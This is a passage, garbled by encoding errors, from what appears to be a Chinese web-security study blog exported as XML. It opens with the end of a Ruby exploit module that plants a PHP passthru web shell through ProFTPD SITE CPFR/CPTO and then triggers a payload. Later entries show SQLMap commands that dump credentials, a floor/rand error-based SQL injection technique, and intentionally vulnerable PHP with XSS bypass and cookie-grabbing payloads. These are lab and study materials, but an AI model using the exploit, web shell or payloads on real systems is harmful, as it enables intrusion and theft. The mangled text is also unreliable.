fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying from /proc/self/cmdline&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    sock.put(<span class="string">&quot;SITE CPTO #&#123;datastore[&#x27;TMPPATH&#x27;]&#125;/.&lt;?php passthru(<span class="subst">$_GET</span>[\&#x27;#&#123;get_arg&#125;\&#x27;]);?&gt;\r\n&quot;</span>)</span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;250&#x27;</span>)</span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying to temporary payload file&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    sock.put(<span class="string">&quot;SITE CPFR #&#123;datastore[&#x27;TMPPATH&#x27;]&#125;/.&lt;?php passthru(<span class="subst">$_GET</span>[\&#x27;#&#123;get_arg&#125;\&#x27;]);?&gt;\r\n&quot;</span>)</span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;350&#x27;</span>)</span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying from temporary payload file&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    sock.put(<span class="string">&quot;SITE CPTO #&#123;datastore[&#x27;SITEPATH&#x27;]&#125;/#&#123;payload_name&#125;\r\n&quot;</span>)</span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;250&#x27;</span>)</span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying PHP payload to website path, directory not writable?&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    sock.close</span><br><span class="line"></span><br><span class="line">    print_status(<span class="string">&quot;#&#123;peer&#125; - Executing PHP payload #&#123;target_uri.path&#125;#&#123;payload_name&#125;&quot;</span>)</span><br><span class="line">    res = send_request_cgi!(</span><br><span class="line">      <span class="string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, payload_name),</span><br><span class="line">      <span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;vars_get&#x27;</span> =&gt; &#123; get_arg =&gt; <span class="string">&quot;nohup #&#123;payload.encoded&#125; &amp;&quot;</span> &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    unless res &amp;&amp; res.code == <span class="number">200</span></span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure executing payload&quot;</span>)</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>VulnHub</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨å­¦ä¹ ä¹‹SQLMapå…¥é—¨å­¦ä¹ </title>
    <url>/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨å­¦ä¹ ä¹‹SQLMapå…¥é—¨å­¦ä¹ ">Webå®‰å…¨å­¦ä¹ ä¹‹SQLMapå…¥é—¨å­¦ä¹ </h1>
<p>SQLMapæ³¨å…¥ç¥å™¨ï¼Œå…ˆå°±ç®€å•çš„ä»‹ç»ä¸€ä¸‹æœ€æœ€æœ€æœ€åŸºç¡€çš„ç”¨æ³•ï¼Œç­‰å›¾ä¹¦é¦†ä»€ä¹ˆæ—¶å€™æ”¶å½•äº†ã€ŠSQLMapä»å…¥é—¨åˆ°ç²¾é€šã€‹è¿™æœ¬ä¹¦ï¼Œå†è®¤çœŸç ”ç©¶è¿™ä¸ªå·¥å…·ï¼ˆå…¶å®çœ‹åˆ°è¿™ä¸ªä¹¦åå°±æœ‰ç‚¹ä¸é€‚ï¼‰ã€‚</p>
<h2 id="ä½¿ç”¨SQLMap">ä½¿ç”¨SQLMap</h2>
<blockquote>
<p>ä½¿ç”¨sqli-labsçš„æ•°æ®åº“å’Œé¡µé¢ä½œä¸ºç¤ºä¾‹ã€‚</p>
</blockquote>
<p>å·²çŸ¥å­˜åœ¨æ³¨å…¥ç‚¹<code>http://localhost/sqlilabs/Less-1/</code>ï¼Œä½¿ç”¨SQLMapå¯¹å…¶æå–ç®¡ç†å‘˜æ•°æ®ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<h2 id="ç¬¬ä¸€æ­¥ï¼šåˆ¤æ–­æ˜¯å¦æ˜¯æ³¨å…¥ç‚¹">ç¬¬ä¸€æ­¥ï¼šåˆ¤æ–­æ˜¯å¦æ˜¯æ³¨å…¥ç‚¹</h2>
<p><code>sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot;</code></p>
<p>ä½¿ç”¨<code>-u</code>å‚æ•°æŒ‡å®šURLï¼Œå¦‚æœURLå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå°†ä¼šæ˜¾ç¤ºå‡ºWebå®¹å™¨ï¼Œæ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="https://i.loli.net/2019/10/11/GiJ2hsToFlA9xQa.png" alt=""></p>
<h2 id="ç¬¬äºŒæ­¥ï¼šè·å–æ•°æ®åº“">ç¬¬äºŒæ­¥ï¼šè·å–æ•°æ®åº“</h2>
<p><code>sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --dbs</code></p>
<p>ä½¿ç”¨<code>--dbs</code>å‚æ•°è¯»å–æ•°æ®åº“ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2019/10/11/tAV2TqoLZjhkIW3.png" alt=""></p>
<h2 id="ç¬¬ä¸‰æ­¥ï¼šæŸ¥çœ‹å½“å‰åº”ç”¨ç¨‹åºæ‰€ç”¨æ•°æ®åº“">ç¬¬ä¸‰æ­¥ï¼šæŸ¥çœ‹å½“å‰åº”ç”¨ç¨‹åºæ‰€ç”¨æ•°æ®åº“</h2>
<p><code>sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --current-db</code></p>
<p><img src="https://i.loli.net/2019/10/11/YlE2mBPOukSajCN.png" alt=""></p>
<h2 id="ç¬¬å››æ­¥ï¼šåˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„æ‰€æœ‰è¡¨">ç¬¬å››æ­¥ï¼šåˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„æ‰€æœ‰è¡¨</h2>
<p><code>sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --tables -D &quot;security&quot;</code></p>
<p>ä½¿ç”¨<code>--table</code>å‚æ•°è·å–æ•°æ®åº“è¡¨ï¼Œ<code>-D</code>å‚æ•°æŒ‡å®šæ•°æ®åº“ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2019/10/11/DHF5eToudC2lvmZ.png" alt=""></p>
<h2 id="ç¬¬äº”æ­¥ï¼šè¯»å–æŒ‡å®šè¡¨ä¸­çš„å­—æ®µåç§°">ç¬¬äº”æ­¥ï¼šè¯»å–æŒ‡å®šè¡¨ä¸­çš„å­—æ®µåç§°</h2>
<p><code>sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --columns -T &quot;users&quot; -D &quot;security&quot;</code></p>
<p>ä½¿ç”¨<code>--columns</code>å‚æ•°åˆ—å–å­—æ®µåï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2019/10/11/e18pfm4uWEaoyMA.png" alt=""></p>
<h2 id="ç¬¬å…­æ­¥ï¼šè¯»å–æŒ‡å®šå­—æ®µå†…å®¹">ç¬¬å…­æ­¥ï¼šè¯»å–æŒ‡å®šå­—æ®µå†…å®¹</h2>
<p><code>sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --dump -C &quot;username, password&quot; -T &quot;users&quot; -D &quot;security&quot;</code></p>
<p><code>--dump</code>æ„å‘³è½¬å­˜æ•°æ®ï¼Œ<code>-C</code>æŒ‡å®šå­—æ®µåç§°ï¼Œ<code>-T</code>æŒ‡å®šè¡¨åï¼Œ<code>-D</code>æŒ‡å®šæ•°æ®åº“åç§°ã€‚</p>
<p><img src="https://i.loli.net/2019/10/11/H3N52dEqahznpWK.png" alt=""></p>
<p>åœ¨è¯»å–æ•°æ®åï¼ŒSQLMapä¼šæŠŠè¯»å–çš„æ•°æ®è½¬å­˜åˆ°<code>SQLMap/output/</code>ç›®å½•ä¸‹ã€‚</p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>sqlæ³¨å…¥</tag>
        <tag>SQLMap</tag>
      </tags>
  </entry>
  <entry>
    <title>webå®‰å…¨å­¦ä¹ ä¹‹SQLæ³¨å…¥â€”â€”åŒæŸ¥è¯¢æŠ¥é”™æ³¨å…¥åŠå…¶åŸç†</title>
    <url>/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="webå®‰å…¨å­¦ä¹ ä¹‹SQLæ³¨å…¥â€”â€”åŒæŸ¥è¯¢æŠ¥é”™æ³¨å…¥åŠå…¶åŸç†">webå®‰å…¨å­¦ä¹ ä¹‹SQLæ³¨å…¥â€”â€”åŒæŸ¥è¯¢æŠ¥é”™æ³¨å…¥åŠå…¶åŸç†</h1>
<p>å¦‚æœæ˜¯SQLæŠ¥é”™æ³¨å…¥çš„è¯ï¼Œç»å¸¸ä¼šçœ‹åˆ°ä¸€ä¸ªæŠ¥é”™å‡½æ•°<code>floor</code>ï¼Œè™½ç„¶æœ‰ç°æˆçš„å…¬å¼ç»™ä½ å¥—ç”¨ï¼Œä½†æˆ‘è¿˜æ˜¯è§‰å¾—æœ‰å¿…è¦å¼„æ¸…æ¥šé‡Œé¢çš„åŸç†ã€‚</p>
<h2 id="payloadå½¢æˆ">payloadå½¢æˆ</h2>
<p>åŒæ³¨å…¥payloadéœ€è¦ç”¨åˆ°å››ä¸ªå‡½æ•°å’Œä¸€ä¸ªgroup byè¯­å¥ï¼š</p>
<ol>
<li><code>group by</code>ï¼šåˆ†ç»„è¯­å¥ï¼›</li>
<li><code>rand()</code>ï¼šéšæœºç”Ÿæˆå‡½æ•°ï¼›</li>
<li><code>floor()</code>ï¼šå–æ•´å‡½æ•°ï¼›</li>
<li><code>concat()</code>ï¼šå­—ç¬¦ä¸²è¿æ¥å‡½æ•°ï¼›</li>
<li><code>count()</code>ï¼šç»Ÿè®¡å‡½æ•°ã€‚</li>
</ol>
<p>ç”¨sqli-labsä¸­çš„æ•°æ®åº“ä¸ºç¤ºä¾‹ï¼š</p>
<h3 id="concatå‡½æ•°">concatå‡½æ•°</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT concat(&quot;testï¼š&quot;,(SELECT database()))as a;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/09/17/4KfjIGJWsXSVnAo.png" alt=""></p>
<p>æ‰§è¡ŒæŸ¥è¯¢æ“ä½œæ—¶ï¼Œå­æŸ¥è¯¢å…ˆå¼€å§‹ï¼Œæ‰€ä»¥<code>SELECT database()</code>å…ˆæ‰§è¡Œï¼Œç„¶åæŸ¥è¯¢åˆ°å½“å‰æ•°æ®åº“åç§°â€securityâ€œï¼Œå¹¶å°†å…¶ä¼ ç»™concatå‡½æ•°ï¼Œconcatå‡½æ•°åœ¨å¯¹å­—ç¬¦è¿›è¡Œè¿æ¥ï¼Œäºæ˜¯æ˜¾ç¤ºå‡ºå›¾ä¸Šçš„ç»“æœã€‚</p>
<h3 id="randå‡½æ•°">randå‡½æ•°</h3>
<p>rand()å‡½æ•°ï¼Œå…¶ä½œç”¨æ˜¯ç”Ÿæˆä¸€ä¸ªå¤§äº0å°äº1çš„éšæœºæµ®ç‚¹æ•°ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2019/09/17/SChATiln4O8zgMv.png" alt=""></p>
<h3 id="floorå‡½æ•°">floorå‡½æ•°</h3>
<p>floor()å‡½æ•°çš„ä½œç”¨æ˜¯å¯¹ä¼ å…¥çš„å‚æ•°å–æ•´ï¼Œè¿™é‡Œå°†rand()ç”Ÿæˆçš„éšæœºæ•°åšå¤„ç†è¿›è¡Œå–æ•´ï¼Œç”±äºrand()ç”Ÿæˆçš„å€¼å–æ•´ç»“æœåªèƒ½ä¸º0ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œåšä¸€ç‚¹å¤„ç†ï¼Œä½¿å…¶ç”Ÿæˆä¸€ä¸ªå¤§äº0å°äº2çš„éšæœºå€¼ï¼Œå¹¶å¯¹å…¶å–æ•´ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT floor(rand()*2);</span><br></pre></td></tr></table></figure>
<p>ç»“æœè¦ä¹ˆä¸º0è¦ä¹ˆä¸º1ï¼š</p>
<p><img src="https://i.loli.net/2019/09/17/OcsVkCoTShBtfLg.png" alt=""></p>
<p>æ¥ä¸‹æ¥ç»“åˆå­æŸ¥è¯¢ï¼Œæ˜¾ç¤ºå‡ºæ•°æ®åº“ä¿¡æ¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT concat((SELECT database()), floor(rand()*2)) from users;</span><br></pre></td></tr></table></figure>
<p>usersè¡¨æœ‰å¤šå°‘æ¡æ•°æ®å°±ä¼šè¿”å›å¤šå°‘æ¡ä¿¡æ¯ï¼š</p>
<p><img src="https://i.loli.net/2019/09/17/7C3miecI6Ot59Xa.png" alt=""></p>
<p>åœ¨æ³¨å…¥ä¸­ï¼Œæˆ‘ä»¬ä¸çŸ¥é“åº“åè¡¨åï¼Œå¾€å¾€å€ŸåŠ©information_schemaè¿™ä¸ªåº“è¿›è¡ŒçŒœè§£</p>
<p>å…¶ä¸­<code>information_schema.schemata</code>ä¸­åŒ…å«äº†mysqlçš„æ‰€æœ‰åº“åï¼Œ<code>information_schema.tables</code>ä¸­åŒ…å«äº†æ‰€æœ‰çš„è¡¨åï¼Œ<code>information_schema.columns</code>ä¸­åŒ…å«äº†æ‰€æœ‰çš„åˆ—åã€‚</p>
<h3 id="group-byè¯­å¥">group byè¯­å¥</h3>
<p>ç°åœ¨åŠ ä¸Šgroup byè¯­å¥å¯¹è¿”å›çš„æ•°æ®è¿›è¡Œåˆ†ç»„å¤„ç†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT concat((SELECT database()), floor(rand()*2))as a from information_schema.schemata group by a;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/09/17/1cdrxsztIjBYZqf.png" alt=""></p>
<h3 id="countå‡½æ•°">countå‡½æ•°</h3>
<p>è¿™é‡Œå¢åŠ ä¸€ä¸ªèšåˆå‡½æ•°countï¼Œæ„é€ çš„è¯­å¥å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT count(*),concat((SELECT database()), floor(rand()*2))as a from information_schema.schemata group by a;</span><br></pre></td></tr></table></figure>
<p>å½“æˆ‘ä»¬åŠ ä¸Šcount(*)å‡½æ•°æ—¶ï¼Œæ“ä½œè¿‡ç¨‹ä¸ºï¼šæŸ¥çœ‹è™šæ‹Ÿè¡¨æ˜¯å¦å­˜åœ¨è¯¥ä¸»é”®å€¼ï¼Œä¸å­˜åœ¨åˆ™æ’å…¥æ–°è®°å½•ï¼Œå­˜åœ¨åˆ™count(*)å­—æ®µç›´æ¥åŠ 1ã€‚</p>
<p>è¿™é‡Œåˆ©ç”¨count(*)å¯¹å‰é¢çš„è¿”å›æ•°æ®è¿›è¡Œç»Ÿè®¡ï¼Œç”±äºgroup by å’Œéšæœºæ•°çš„åŸå› ï¼Œæœ‰å¯èƒ½ä¼šå‡ºç°é‡å¤çš„é”®å€¼ï¼Œå½“é”®å€¼é‡å¤æ—¶å°±ä¼šè§¦å‘é”™è¯¯ï¼Œç„¶åæŠ¥é”™ï¼Œç”±äºå­æŸ¥è¯¢åœ¨é”™è¯¯å‘ç”Ÿä¹‹å‰å°±å·²ç»å®Œæˆï¼Œæ‰€ä»¥å­æŸ¥è¯¢çš„å†…å®¹ä¼šéšç€æŠ¥é”™ä¿¡æ¯ä¸€èµ·æ˜¾ç¤ºå‡ºæ¥ï¼š</p>
<p><img src="https://i.loli.net/2019/09/17/SPWnlZtj3DMfw42.png" alt=""></p>
<h2 id="payloadåŸç†">payloadåŸç†</h2>
<p>ç›´æ¥æŠŠ<a href="https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html">è¿™ä¸€ç¯‡æ–‡ç« </a>æ¬è¿è¿‡æ¥å§ï¼Œå†™å¾—éå¸¸å¥½ï¼Œåœ¨æ­¤å°±åšä¸ªå°çš„æ€»ç»“ï¼š</p>
<p>é€šè¿‡flooræŠ¥é”™çš„æ–¹æ³•æ¥çˆ†æ•°æ®çš„æœ¬è´¨æ˜¯group byè¯­å¥çš„æŠ¥é”™ã€‚group byè¯­å¥æŠ¥é”™çš„åŸå› æ˜¯<code>floor(random(0)*2)</code>çš„ä¸ç¡®å®šæ€§ï¼Œå³å¯èƒ½ä¸º0ä¹Ÿå¯èƒ½ä¸º1,<code>ï¼ˆgroup by key</code>çš„åŸç†æ˜¯å¾ªç¯è¯»å–æ•°æ®çš„æ¯ä¸€è¡Œï¼Œå°†ç»“æœä¿å­˜äºä¸´æ—¶è¡¨ä¸­ã€‚è¯»å–æ¯ä¸€è¡Œçš„keyæ—¶ï¼Œå¦‚æœkeyå­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™ä¸åœ¨ä¸´æ—¶è¡¨ä¸­æ›´æ–°ä¸´æ—¶è¡¨ä¸­çš„æ•°æ®ï¼›å¦‚æœè¯¥keyä¸å­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™åœ¨ä¸´æ—¶è¡¨ä¸­æ’å…¥keyæ‰€åœ¨è¡Œçš„æ•°æ®ã€‚<code>group by floor(random(0)*2)</code>å‡ºé”™çš„åŸå› æ˜¯keyæ˜¯ä¸ªéšæœºæ•°ï¼Œæ£€æµ‹ä¸´æ—¶è¡¨ä¸­keyæ˜¯å¦å­˜åœ¨æ—¶è®¡ç®—äº†ä¸€ä¸‹<code>floor(random(0)*2)</code>å¯èƒ½ä¸º0ï¼Œå¦‚æœæ­¤æ—¶ä¸´æ—¶è¡¨åªæœ‰keyä¸º1çš„è¡Œå’Œä¸å­˜åœ¨keyä¸º0çš„è¡Œï¼Œé‚£ä¹ˆæ•°æ®åº“è¦å°†è¯¥æ¡è®°å½•æ’å…¥ä¸´æ—¶è¡¨ï¼Œç”±äºæ˜¯éšæœºæ•°ï¼Œæ’æ—¶åˆè¦è®¡ç®—ä¸€ä¸‹éšæœºå€¼ï¼Œæ­¤æ—¶<code>floor(random(0)*2)</code>ç»“æœå¯èƒ½ä¸º1ï¼Œå°±ä¼šå¯¼è‡´æ’å…¥æ—¶å†²çªè€ŒæŠ¥é”™ã€‚å³æ£€æµ‹æ—¶å’Œæ’å…¥æ—¶ä¸¤æ¬¡è®¡ç®—äº†éšæœºæ•°çš„å€¼ã€‚</p>
<p>ç»“è®ºæ˜¯ï¼šå½“ä¸ä¸´æ—¶è¡¨é‡Œé¢çš„å€¼è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸åŒï¼Œå°±æ’å…¥ï¼Œä½†æ˜¯æ’å…¥çš„æ—¶å€™åˆè®¡ç®—äº†ä¸€æ¬¡ï¼Œæ‰€ä»¥å¦‚æœæ’å…¥æ—¶è®¡ç®—çš„å€¼ä¸ç›´æ¥æ¯”è¾ƒçš„å€¼ä¸ä¸€æ ·ï¼Œåˆ™æŠ¥é”™</p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>sqlæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨å­¦ä¹ ä¹‹XSSæ¼æ´å®æˆ˜å­¦ä¹ </title>
    <url>/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨å­¦ä¹ ä¹‹XSSæ¼æ´å®æˆ˜å­¦ä¹ ">Webå®‰å…¨å­¦ä¹ ä¹‹XSSæ¼æ´å®æˆ˜å­¦ä¹ </h1>
<ol>
<li>ç¼–å†™ä¸€ä¸ªå­˜åœ¨ xss æ¼æ´çš„é¡µé¢</li>
<li>åˆ©ç”¨ xss æ¼æ´è·å–å½“å‰ç”¨æˆ· cookie</li>
<li>æ€è€ƒï¼Œåˆ©ç”¨ xss æ¼æ´èƒ½å¹²å˜›ï¼ˆå‚è€ƒ beefï¼‰</li>
<li>æ‰©å±•å­¦ä¹ ï¼šå­¦ä¹ å¦‚ä½•é˜²å¾¡ xssã€æ€»ç»“é˜²å¾¡ç­–ç•¥åŠ åˆ°æŠ¥å‘Šé‡Œ</li>
</ol>
<blockquote>
<p>è¦æ±‚ï¼šè®°å½•ç¼–å†™çš„é¡µé¢ä»£ç ã€æ“ä½œæµç¨‹ã€æ€è€ƒæ€»ç»“</p>
</blockquote>
<h2 id="0x01-XSSæ¼æ´">0x01 XSSæ¼æ´</h2>
<p>XSS(Cross Site Scripting)è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œä¹Ÿæ˜¯ä¸€ç§æ³¨å…¥æ”»å‡»ï¼Œå½“webåº”ç”¨å¯¹ç”¨æˆ·è¾“å…¥è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œæ”»å‡»è€…å†™å…¥æ¶æ„çš„è„šæœ¬ä»£ç ï¼ˆHTMLã€JavaScriptï¼‰åˆ°ç½‘é¡µä¸­æ—¶ï¼Œå¦‚æœç”¨æˆ·è®¿é—®äº†å«æœ‰æ¶æ„ä»£ç çš„é¡µé¢ï¼Œæ¶æ„è„šæœ¬å°±ä¼šè¢«æµè§ˆå™¨è§£ææ‰§è¡Œå¯¼è‡´ç”¨æˆ·è¢«æ”»å‡»ã€‚</p>
<p>å¸¸è§çš„å±å®³æœ‰ï¼šcookieçªƒå–ï¼ŒsessionåŠ«æŒï¼Œé’“é±¼æ”»å‡»ï¼Œè •è™«ï¼Œddosç­‰ã€‚</p>
<h2 id="0x02-XSSæ¼æ´åˆ†ç±»å’Œä»£ç æ¡ˆä¾‹">0x02 XSSæ¼æ´åˆ†ç±»å’Œä»£ç æ¡ˆä¾‹</h2>
<h3 id="åå°„å‹XSS">åå°„å‹XSS</h3>
<h4 id="åŸç†">åŸç†</h4>
<p>åå°„å‹xssä¸€èˆ¬å‡ºç°åœ¨URLå‚æ•°ä¸­åŠç½‘ç«™æœç´¢æ ä¸­ï¼Œç”±äºéœ€è¦ç‚¹å‡»åŒ…å«æ¶æ„ä»£ç çš„URLæ‰å¯ä»¥è§¦å‘ï¼Œå¹¶ä¸”åªèƒ½è§¦å‘ä¸€æ¬¡ï¼Œæ‰€ä»¥ä¹Ÿè¢«ç§°â€éæŒä¹…æ€§xssâ€ã€‚</p>
<h4 id="ä»£ç æ¡ˆä¾‹">ä»£ç æ¡ˆä¾‹</h4>
<ol>
<li>
<p>Low Level</p>
<p>æ¼æ´ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . $_GET[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">setcookie(<span class="string">&quot;Cookie&quot;</span>, <span class="string">&quot;Test&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ¼æ´åˆ©ç”¨ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191109155810.png" alt=""></p>
</li>
<li>
<p>Medium Level</p>
<p>æ¼æ´ä»£ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (array_key_exists(&quot;name&quot;, $_GET) &amp;&amp; $_GET[&#39;name&#39;] !&#x3D; NULL) &#123;</span><br><span class="line">	$name &#x3D; str_replace(&#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[&#39;name&#39;]);</span><br><span class="line"></span><br><span class="line">	echo &quot;&lt;pre&gt;Hello &#123;$name&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">setcookie(&quot;Medium&quot;, &quot;CookieTest&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>æ¼æ´åˆ©ç”¨ï¼š</p>
<ul>
<li>åŒå†™<code>&lt;script&gt;</code>æ ‡ç­¾ï¼š<code>&lt;s&lt;script&gt;cript&gt;</code></li>
<li>æ ‡ç­¾è½¬æ¢å¤§å°å†™ï¼š<code>&lt;SCRipt&gt;</code></li>
</ul>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191109160026.png" alt=""></p>
</li>
<li>
<p>High Level</p>
<p>æ¼æ´ä»£ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>æ¼æ´åˆ©ç”¨ï¼š</p>
<p>è¿™é‡Œä½¿ç”¨äº†æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤äº†<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œ è¿™æ—¶å€™ä¸è®ºæ˜¯å¤§å°å†™ã€åŒå±‚<code>&lt;script&gt;</code>éƒ½æ— æ³•ç»•è¿‡ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨åˆ«çš„æ ‡ç­¾ï¼Œæ¯”å¦‚<code>&lt;img&gt;</code>ã€‚</p>
<p>payloadï¼š<code> &lt;img src=0 onerror=alert(document.cookie)&gt; </code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191109160653.png" alt=""></p>
</li>
</ol>
<h3 id="å­˜å‚¨å‹XSS">å­˜å‚¨å‹XSS</h3>
<h4 id="åŸç†-v2">åŸç†</h4>
<p>å…è®¸ç”¨æˆ·æäº¤æ•°æ®çš„Webåº”ç”¨ç¨‹åºéƒ½æœ‰å¯èƒ½ä¼šå‡ºç°å­˜å‚¨å‹XSSæ¼æ´ï¼Œå½“æ”»å‡»è€…æäº¤ä¸€æ®µXSSä»£ç åï¼Œè¢«æœåŠ¡å™¨æ¥æ”¶å¹¶å­˜å‚¨ï¼Œå½“æ”»å‡»è€…å†æ¬¡è®¿é—®æŸä¸ªé¡µé¢æ—¶ï¼Œè¿™æ®µXSSä»£ç è¢«ç¨‹åºè¯»å‡ºæ¥å“åº”ç»™æµè§ˆå™¨ï¼Œé€ æˆXSSè·¨ç«™æ”»å‡»ï¼Œè¿™å°±æ˜¯å­˜å‚¨å‹XSSã€‚</p>
<h4 id="ä»£ç æ¡ˆä¾‹-v2">ä»£ç æ¡ˆä¾‹</h4>
<ol>
<li>
<p>Low Level</p>
<p>å‰ç«¯é¡µé¢ä»£ç ï¼š</p>
